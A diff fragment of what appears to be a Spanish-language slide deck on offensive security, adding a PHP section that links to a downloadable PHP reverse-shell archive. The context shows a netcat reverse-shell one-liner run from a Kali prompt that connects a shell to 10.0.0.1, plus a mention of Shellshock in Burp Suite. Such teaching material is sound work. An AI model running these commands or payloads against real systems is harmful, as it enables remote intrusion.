@@ -38,6 +38,10 @@ paginate: true
 ┌─[root@kali]─[/home/user/demo/exploit]
 └──╼ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
+
+## PHP
+En PHP se puede ingresar un archivo malicioso que devuelva una [reverse shell](https://download1510.mediafire.com/fvfmudo0p5gg/a3i5v7urr7cp6gw/php-reverse-shell-1.0.tar.gz).
+
 ### Ejemplo de uso
 En burpsuite se podría ocupar en ataques como Shellshock, por ejemplo:
 ```bash
